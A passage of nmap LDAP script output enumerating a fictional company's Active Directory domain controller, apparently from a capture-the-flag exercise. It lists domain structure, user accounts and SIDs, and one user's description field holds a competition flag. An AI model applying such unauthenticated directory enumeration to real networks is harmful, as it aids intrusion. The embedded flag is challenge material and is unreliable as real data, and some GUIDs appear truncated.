    |       supportedControl: 1.2.840.113556.1.4.2064
    |       supportedControl: 1.2.840.113556.1.4.2065
    |       supportedControl: 1.2.840.113556.1.4.2066
    |       supportedControl: 1.2.840.113556.1.4.2090
    |       supportedControl: 1.2.840.113556.1.4.2205
    |       supportedControl: 1.2.840.113556.1.4.2204
    |       supportedControl: 1.2.840.113556.1.4.2206
    |       supportedControl: 1.2.840.113556.1.4.2211
    |       supportedControl: 1.2.840.113556.1.4.2239
    |       supportedControl: 1.2.840.113556.1.4.2255
    |       supportedControl: 1.2.840.113556.1.4.2256
    |       supportedControl: 1.2.840.113556.1.4.2309
    |       supportedLDAPVersion: 3
    |       supportedLDAPVersion: 2
    |       supportedLDAPPolicies: MaxPoolThreads
    |       supportedLDAPPolicies: MaxPercentDirSyncRequests
    |       supportedLDAPPolicies: MaxDatagramRecv
    |       supportedLDAPPolicies: MaxReceiveBuffer
    |       supportedLDAPPolicies: InitRecvTimeout
    |       supportedLDAPPolicies: MaxConnections
    |       supportedLDAPPolicies: MaxConnIdleTime
    |       supportedLDAPPolicies: MaxPageSize
    |       supportedLDAPPolicies: MaxBatchReturnMessages
    |       supportedLDAPPolicies: MaxQueryDuration
    |       supportedLDAPPolicies: MaxDirSyncDuration
    |       supportedLDAPPolicies: MaxTempTableSize
    |       supportedLDAPPolicies: MaxResultSetSize
    |       supportedLDAPPolicies: MinResultSets
    |       supportedLDAPPolicies: MaxResultSetsPerConn
    |       supportedLDAPPolicies: MaxNotificationPerConn
    |       supportedLDAPPolicies: MaxValRange
    |       supportedLDAPPolicies: MaxValRangeTransitive
    |       supportedLDAPPolicies: ThreadMemoryLimit
    |       supportedLDAPPolicies: SystemMemoryLimitPercent
    |       highestCommittedUSN: 585355
    |       supportedSASLMechanisms: GSSAPI
    |       supportedSASLMechanisms: GSS-SPNEGO
    |       supportedSASLMechanisms: EXTERNAL
    |       supportedSASLMechanisms: DIGEST-MD5
    |       dnsHostName: GDC-DC-S.gdc.local
    |       ldapServiceName: gdc.local:gdc-dc-s$@GDC.LOCAL
    |       serverName: CN=GDC-DC-S,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=gdc,DC=local
    |       supportedCapabilities: 1.2.840.113556.1.4.800
    |       supportedCapabilities: 1.2.840.113556.1.4.1670
    |       supportedCapabilities: 1.2.840.113556.1.4.1791
    |       supportedCapabilities: 1.2.840.113556.1.4.1935
    |       supportedCapabilities: 1.2.840.113556.1.4.2080
    |       supportedCapabilities: 1.2.840.113556.1.4.2237
    |       isSynchronized: TRUE
    |       isGlobalCatalogReady: TRUE
    |       domainFunctionality: 7
    |       forestFunctionality: 7
    |_      domainControllerFunctionality: 7
    | ldap-search: 
    |   Context: DC=gdc,DC=local
    |     dn: DC=gdc,DC=local
    |     dn: OU=Management,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: organizationalUnit
    |         ou: Management
    |         distinguishedName: OU=Management,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:49:38 UTC
    |         whenChanged: 2021/06/18 22:49:49 UTC
    |         uSNCreated: 12803
    |         uSNChanged: 12808
    |         name: Management
    |         objectGUID: 224cd37a-c189-b244-a52e-f1c7fc9d5a8f
    |         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 2021/06/18 22:49:49 UTC
    |         dSCorePropagationData: 2021/06/18 22:49:38 UTC
    |         dSCorePropagationData: 2021/06/18 22:49:38 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: organizationalUnit
    |         ou: Users
    |         distinguishedName: OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:49:49 UTC
    |         whenChanged: 2021/06/18 22:49:49 UTC
    |         uSNCreated: 12806
    |         uSNChanged: 12807
    |         name: Users
    |         objectGUID: d7a7c86e-9a4a-b049-b5bb-fd395052cda
    |         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 2021/06/18 22:49:49 UTC
    |         dSCorePropagationData: 2021/06/18 22:49:49 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: OU=Finance,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: organizationalUnit
    |         ou: Finance
    |         distinguishedName: OU=Finance,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:50:05 UTC
    |         whenChanged: 2021/06/18 22:50:14 UTC
    |         uSNCreated: 12809
    |         uSNChanged: 12813
    |         name: Finance
    |         objectGUID: 422a75eb-379a-d445-845-6e5868f7c3c1
    |         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 2021/06/18 22:50:14 UTC
    |         dSCorePropagationData: 2021/06/18 22:50:05 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: OU=Users,OU=Finance,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: organizationalUnit
    |         ou: Users
    |         distinguishedName: OU=Users,OU=Finance,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:50:14 UTC
    |         whenChanged: 2021/06/18 22:50:14 UTC
    |         uSNCreated: 12811
    |         uSNChanged: 12812
    |         name: Users
    |         objectGUID: a0ad453d-ad5c-624d-bec8-ba825dbf6085
    |         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 2021/06/18 22:50:14 UTC
    |         dSCorePropagationData: 2021/06/18 22:50:14 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: OU=Sales,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: organizationalUnit
    |         ou: Sales
    |         distinguishedName: OU=Sales,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:50:28 UTC
    |         whenChanged: 2021/06/18 22:50:37 UTC
    |         uSNCreated: 12814
    |         uSNChanged: 12818
    |         name: Sales
    |         objectGUID: 978b3487-98ea-b842-a97f-c37430e6a48
    |         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 2021/06/18 22:50:37 UTC
    |         dSCorePropagationData: 2021/06/18 22:50:28 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: OU=Users,OU=Sales,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: organizationalUnit
    |         ou: Users
    |         distinguishedName: OU=Users,OU=Sales,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:50:37 UTC
    |         whenChanged: 2021/06/18 22:50:37 UTC
    |         uSNCreated: 12816
    |         uSNChanged: 12817
    |         name: Users
    |         objectGUID: 31b708b-1b5e-2743-aff9-322e10d8769c
    |         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 2021/06/18 22:50:37 UTC
    |         dSCorePropagationData: 2021/06/18 22:50:37 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: OU=Information Technology,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: organizationalUnit
    |         ou: Information Technology
    |         distinguishedName: OU=Information Technology,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:51:01 UTC
    |         whenChanged: 2021/06/18 22:51:17 UTC
    |         uSNCreated: 12819
    |         uSNChanged: 12823
    |         name: Information Technology
    |         objectGUID: 5b97d498-bd3-dd4e-8c24-4c4d8074e474
    |         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 2021/06/18 22:51:17 UTC
    |         dSCorePropagationData: 2021/06/18 22:51:01 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: OU=Users,OU=Information Technology,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: organizationalUnit
    |         ou: Users
    |         distinguishedName: OU=Users,OU=Information Technology,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:51:17 UTC
    |         whenChanged: 2021/06/18 22:51:17 UTC
    |         uSNCreated: 12821
    |         uSNChanged: 12822
    |         name: Users
    |         objectGUID: d166b49d-c9c3-8a45-9b4c-7d1fa1bdcb
    |         objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 2021/06/18 22:51:17 UTC
    |         dSCorePropagationData: 2021/06/18 22:51:17 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=Catherine Weaver,OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: Catherine Weaver
    |         sn: Weaver
    |         title: CEO at Global Domination Corporation
    |         description: CEO at Global Domination Corporation
    |         givenName: Catherine
    |         distinguishedName: CN=Catherine Weaver,OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/18 22:53:45 UTC
    |         displayName: Weaver, Catherine
    |         uSNCreated: 12828
    |         memberOf: CN=Management,OU=Groups,OU=GDC,DC=gdc,DC=local
    |         uSNChanged: 12832
    |         company: GlobalDominationCorporation
    |         name: Catherine Weaver
    |         objectGUID: 1482068-2412-5d42-846d-73844ba64b6
    |         userAccountControl: 512
    |         badPwdCount: 15113
    |         codePage: 0
    |         countryCode: 0
    |         badPasswordTime: 2021-06-24T05:34:45+00:00
    |         lastLogoff: 0
    |         lastLogon: Never
    |         pwdLastSet: 2021-06-18T15:07:44+00:00
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1112
    |         accountExpires: 30828-09-13T19:02:04+00:00
    |         logonCount: 0
    |         sAMAccountName: catherine.w
    |         sAMAccountType: 805306368
    |         userPrincipalName: catherine.w@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=Emily Lopez,OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: Emily Lopez
    |         sn: Lopez
    |         title: Vice President at Global Domination Corporation
    |         description: Vice President at Global Domination Corporation. CDDC21{GDC2!_1nte4NaL}
    |         givenName: Emily
    |         distinguishedName: CN=Emily Lopez,OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/19 00:04:48 UTC
    |         displayName: Lopez, Emily
    |         uSNCreated: 12834
    |         memberOf: CN=Management,OU=Groups,OU=GDC,DC=gdc,DC=local
    |         uSNChanged: 13029
    |         company: GlobalDominationCorporation
    |         name: Emily Lopez
    |         objectGUID: 304a88d6-c939-f04c-b047-5439ada2f3c
    |         userAccountControl: 512
    |         badPwdCount: 2
    |         codePage: 0
    |         countryCode: 0
    |         badPasswordTime: 2021-06-24T05:38:49+00:00
    |         lastLogoff: 0
    |         lastLogon: Never
    |         pwdLastSet: 2021-06-18T15:07:44+00:00
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1113
    |         accountExpires: 30828-09-13T19:02:04+00:00
    |         logonCount: 0
    |         sAMAccountName: emily.l
    |         sAMAccountType: 805306368
    |         userPrincipalName: emily.l@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=Miles Dyson,OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: Miles Dyson
    |         sn: Dyson
    |         title: Director of Special Projects at Global Domination Corporation
    |         description: Director of Special Projects at Global Domination Corporation
    |         givenName: Miles
    |         distinguishedName: CN=Miles Dyson,OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/18 22:53:45 UTC
    |         displayName: Dyson, Miles
    |         uSNCreated: 12840
    |         memberOf: CN=Management,OU=Groups,OU=GDC,DC=gdc,DC=local
    |         uSNChanged: 12844
    |         company: GlobalDominationCorporation
    |         name: Miles Dyson
    |         objectGUID: 5c676a5-6c25-b747-a824-4c8914d6dd19
    |         userAccountControl: 512
    |         badPwdCount: 18708
    |         codePage: 0
    |         countryCode: 0
    |         badPasswordTime: 2021-06-24T05:14:07+00:00
    |         lastLogoff: 0
    |         lastLogon: Never
    |         pwdLastSet: 2021-06-18T15:07:44+00:00
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1114
    |         accountExpires: 30828-09-13T19:02:04+00:00
    |         logonCount: 0
    |         sAMAccountName: miles.d
    |         sAMAccountType: 805306368
    |         userPrincipalName: miles.d@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=Kimberley Duncan,OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: Kimberley Duncan
    |         sn: Duncan
    |         title: Director of Community Relations and Media Control at Global Domination Corporation
    |         description: Director of Community Relations and Media Control at Global Domination Corporation
    |         givenName: Kimberley
    |         distinguishedName: CN=Kimberley Duncan,OU=Users,OU=Management,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/18 22:53:45 UTC
    |         displayName: Duncan, Kimberley
    |         uSNCreated: 12846
    |         memberOf: CN=Management,OU=Groups,OU=GDC,DC=gdc,DC=local
    |         uSNChanged: 12850
    |         company: GlobalDominationCorporation
    |         name: Kimberley Duncan
    |         objectGUID: 26aba7e1-d17-5c48-afce-f0a137d3216f
    |         userAccountControl: 512
    |         badPwdCount: 1
    |         codePage: 0
    |         countryCode: 0
    |         badPasswordTime: 2021-06-24T05:31:49+00:00
    |         lastLogoff: 0
    |         lastLogon: Never
    |         pwdLastSet: 2021-06-18T15:07:44+00:00
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1115
    |         accountExpires: 30828-09-13T19:02:04+00:00
    |         logonCount: 0
    |         sAMAccountName: kimberley.d
    |         sAMAccountType: 805306368
    |         userPrincipalName: kimberley.d@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=William Russell,OU=Users,OU=Finance,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: William Russell
    |         sn: Russell
    |         title: CFO at Global Domination Corporation
    |         description: CFO at Global Domination Corporation
    |         givenName: William
    |         distinguishedName: CN=William Russell,OU=Users,OU=Finance,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/18 22:53:45 UTC
    |         displayName: Russell, William
    |         uSNCreated: 12852
    |         uSNChanged: 12856
    |         company: GlobalDominationCorporation
    |         name: William Russell
    |         objectGUID: 4d88a9f1-9bd7-fd44-b6ad-17a0c18984ca
    |         userAccountControl: 512
    |         badPwdCount: 1
    |         codePage: 0
    |         countryCode: 0
    |         badPasswordTime: 2021-06-24T05:31:41+00:00
    |         lastLogoff: 0
    |         lastLogon: Never
    |         pwdLastSet: 2021-06-18T15:07:44+00:00
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1116
    |         accountExpires: 30828-09-13T19:02:04+00:00
    |         logonCount: 0
    |         sAMAccountName: william.r
    |         sAMAccountType: 805306368
    |         userPrincipalName: william.r@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=Mia Parker,OU=Users,OU=Finance,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: Mia Parker
    |         sn: Parker
    |         title: Finance Department
    |         description: Finance Department
    |         givenName: Mia
    |         distinguishedName: CN=Mia Parker,OU=Users,OU=Finance,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/18 22:53:45 UTC
    |         displayName: Parker, Mia
    |         uSNCreated: 12858
    |         uSNChanged: 12862
    |         company: GlobalDominationCorporation
    |         name: Mia Parker
    |         objectGUID: 9f644f34-266d-ea4f-85c2-c3f7571b198
    |         userAccountControl: 512
    |         badPwdCount: 1
    |         codePage: 0
    |         countryCode: 0
    |         badPasswordTime: 2021-06-24T05:31:34+00:00
    |         lastLogoff: 0
    |         lastLogon: Never
    |         pwdLastSet: 2021-06-18T15:07:44+00:00
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1117
    |         accountExpires: 30828-09-13T19:02:04+00:00
    |         logonCount: 0
    |         sAMAccountName: mia.p
    |         sAMAccountType: 805306368
    |         userPrincipalName: mia.p@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=James Reed,OU=Users,OU=Finance,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: James Reed
    |         sn: Reed
    |         title: Finance Department
    |         description: Finance Department
    |         givenName: James
    |         distinguishedName: CN=James Reed,OU=Users,OU=Finance,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/18 22:53:45 UTC
    |         displayName: Reed, James
    |         uSNCreated: 12864
    |         uSNChanged: 12868
    |         company: GlobalDominationCorporation
    |         name: James Reed
    |         objectGUID: ae74967b-4ceb-754e-986f-b429bf7b103c
    |         userAccountControl: 512
    |         badPwdCount: 1
    |         codePage: 0
    |         countryCode: 0
    |         badPasswordTime: 2021-06-24T05:31:28+00:00
    |         lastLogoff: 0
    |         lastLogon: Never
    |         pwdLastSet: 2021-06-18T15:07:44+00:00
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1118
    |         accountExpires: 30828-09-13T19:02:04+00:00
    |         logonCount: 0
    |         sAMAccountName: james.r
    |         sAMAccountType: 805306368
    |         userPrincipalName: james.r@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=Leo Garcia,OU=Users,OU=Sales,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: Leo Garcia
    |         sn: Garcia
    |         title: Sales
    |         description: Sales
    |         givenName: Leo
    |         distinguishedName: CN=Leo Garcia,OU=Users,OU=Sales,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/18 22:53:45 UTC
    |         displayName: Garcia, Leo
    |         uSNCreated: 12870
    |         memberOf: CN=Sales,OU=Groups,OU=GDC,DC=gdc,DC=local
    |         uSNChanged: 12874
    |         company: GlobalDominationCorporation
    |         name: Leo Garcia
    |         objectGUID: 72a63fbc-eb49-1c43-a560-a817d2326d28
    |         userAccountControl: 512
    |         badPwdCount: 1
    |         codePage: 0
    |         countryCode: 0
    |         badPasswordTime: 2021-06-24T05:31:15+00:00
    |         lastLogoff: 0
    |         lastLogon: Never
    |         pwdLastSet: 2021-06-18T15:07:44+00:00
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1119
    |         accountExpires: 30828-09-13T19:02:04+00:00
    |         logonCount: 0
    |         sAMAccountName: leo.g
    |         sAMAccountType: 805306368
    |         userPrincipalName: leo.g@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=Adrian Collins,OU=Users,OU=Sales,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: Adrian Collins
    |         sn: Collins
    |         title: Sales
    |         description: Sales
    |         givenName: Adrian
    |         distinguishedName: CN=Adrian Collins,OU=Users,OU=Sales,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/18 22:53:45 UTC
    |         displayName: Collins, Adrian
    |         uSNCreated: 12876
    |         memberOf: CN=Sales,OU=Groups,OU=GDC,DC=gdc,DC=local
    |         uSNChanged: 12880
    |         company: GlobalDominationCorporation
    |         name: Adrian Collins
    |         objectGUID: 128233a5-a682-ba4d-9520-3fa535d7561
    |         userAccountControl: 512
    |         badPwdCount: 1
    |         codePage: 0
    |         countryCode: 0
    |         badPasswordTime: 2021-06-24T05:31:22+00:00
    |         lastLogoff: 0
    |         lastLogon: Never
    |         pwdLastSet: 2021-06-18T15:07:44+00:00
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1120
    |         accountExpires: 30828-09-13T19:02:04+00:00
    |         logonCount: 0
    |         sAMAccountName: adrian.c
    |         sAMAccountType: 805306368
    |         userPrincipalName: adrian.c@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=Adam Lewis,OU=Users,OU=Sales,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: Adam Lewis
    |         sn: Lewis
    |         title: Sales
    |         description: Sales
    |         givenName: Adam
    |         distinguishedName: CN=Adam Lewis,OU=Users,OU=Sales,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/18 22:53:45 UTC
    |         displayName: Lewis, Adam
    |         uSNCreated: 12882
    |         memberOf: CN=Sales,OU=Groups,OU=GDC,DC=gdc,DC=local
    |         uSNChanged: 12886
    |         company: GlobalDominationCorporation
    |         name: Adam Lewis
    |         objectGUID: 7c68794a-5c3e-7541-9819-c51f7232a0
    |         userAccountControl: 512
    |         badPwdCount: 10464
    |         codePage: 0
    |         countryCode: 0
    |         badPasswordTime: 2021-06-24T05:33:19+00:00
    |         lastLogoff: 0
    |         lastLogon: Never
    |         pwdLastSet: 2021-06-18T15:07:44+00:00
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1121
    |         accountExpires: 30828-09-13T19:02:04+00:00
    |         logonCount: 0
    |         sAMAccountName: adam.l
    |         sAMAccountType: 805306368
    |         userPrincipalName: adam.l@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |     dn: CN=Liam Adams,OU=Users,OU=Information Technology,OU=GDC,DC=gdc,DC=local
    |         objectClass: top
    |         objectClass: person
    |         objectClass: organizationalPerson
    |         objectClass: user
    |         cn: Liam Adams
    |         sn: Adams
    |         title: Information Technology - IT Manager
    |         description: Information Technology - IT Manager
    |         givenName: Liam
    |         distinguishedName: CN=Liam Adams,OU=Users,OU=Information Technology,OU=GDC,DC=gdc,DC=local
    |         instanceType: 4
    |         whenCreated: 2021/06/18 22:53:45 UTC
    |         whenChanged: 2021/06/19 00:16:16 UTC
    |         displayName: Adams, Liam
    |         uSNCreated: 12888
    |         memberOf: CN=IT Sec,OU=Groups,OU=GDC,DC=gdc,DC=local
    |         memberOf: CN=IT Admins,OU=Groups,OU=GDC,DC=gdc,DC=local
    |         memberOf: CN=IT,OU=Groups,OU=GDC,DC=gdc,DC=local
    |         uSNChanged: 13037
    |         company: GlobalDominationCorporation
    |         name: Liam Adams
    |         objectGUID: 68dcbf22-9698-c142-94de-7a18321465c
    |         userAccountControl: 4194816
    |         badPwdCount: 0
    |         codePage: 0
    |         countryCode: 0
    |         badPasswordTime: 2021-06-24T05:49:33+00:00
    |         lastLogoff: 0
    |         lastLogon: 2021-06-24T05:50:01+00:00
    |         pwdLastSet: 2021-06-18T16:21:48+00:00
    |         primaryGroupID: 513
    |         objectSid: 1-5-21-695478894-820227133-4274716385-1122
    |         accountExpires: 30828-09-13T19:02:04+00:00
    |         logonCount: 52
    |         sAMAccountName: liam.a
    |         sAMAccountType: 805306368
    |         userPrincipalName: liam.a@gdc.local
    |         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |         dSCorePropagationData: 2021/06/18 23:13:34 UTC
    |         dSCorePropagationData: 1601/01/01 00:00:01 UTC
    |         lastLogonTimestamp: 2021-06-18T16:30:15+00:00
    |         msDS-SupportedEncryptionTypes: 0
    | 
    | 
    |_Result limited to 20 objects (see ldap.maxobjects)
    445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: GDC)
    464/tcp  open  kpasswd5?
    593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp  open  tcpwrapped
    3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: gdc.local, Site: Default-First-Site-Name)
    | ldap-rootdse: 
    | LDAP Results
    |   <ROOT>
    |       currentTime: 20210624133610.0Z
    |       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=gdc,DC=local
    |       dsServiceName: CN=NTDS Settings,CN=GDC-DC-S,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=gdc,DC=local
    |       namingContexts: DC=gdc,DC=local
    |       namingContexts: CN=Configuration,DC=gdc,DC=local
    |       namingContexts: CN=Schema,CN=Configuration,DC=gdc,DC=local
    |       namingContexts: DC=DomainDnsZones,DC=gdc,DC=local
    |       namingContexts: DC=ForestDnsZones,DC=gdc,DC=local
    |       defaultNamingContext: DC=gdc,DC=local
    |       schemaNamingContext: CN=Schema,CN=Configuration,DC=gdc,DC=local
    |       configurationNamingContext: CN=Configuration,DC=gdc,DC=local
    |       rootDomainNamingContext: DC=gdc,DC=local
    |       supportedControl: 1.2.840.113556.1.4.319
    |       supportedControl: 1.2.840.113556.1.4.801
    |       supportedControl: 1.2.840.113556.1.4.473
    |       supportedControl: 1.2.840.113556.1.4.528
    |       supportedControl: 1.2.840.113556.1.4.417
    |       supportedControl: 1.2.840.113556.1.4.619
    |       supportedControl: 1.2.840.113556.1.4.841
    |       supportedControl: 1.2.840.113556.1.4.529
    |       supportedControl: 1.2.840.113556.1.4.805
    |       supportedControl: 1.2.840.113556.1.4.521
    |       supportedControl: 1.2.840.113556.1.4.970
    |       supportedControl: 1.2.840.113556.1.4.1338
    |       supportedControl: 1.2.840.113556.1.4.474
    |       supportedControl: 1.2.840.113556.1.4.1339
    |       supportedControl: 1.2.840.113556.1.4.1340
    |       supportedControl: 1.2.840.113556.1.4.1413
    |       supportedControl: 2.16.840.1.113730.3.4.9
    |       supportedControl: 2.16.840.1.113730.3.4.10
    |       supportedControl: 1.2.840.113556.1.4.1504
    |       supportedControl: 1.2.840.113556.1.4.1852
    |       supportedControl: 1.2.840.113556.1.4.802
    |       supportedControl: 1.2.840.113556.1.4.1907
    |       supportedControl: 1.2.840.113556.1.4.1948
    |       supportedControl: 1.2.840.113556.1.4.1974
    |       supportedControl: 1.2.840.113556.1.4.1341
    |       supportedControl: 1.2.840.113556.1.4.2026
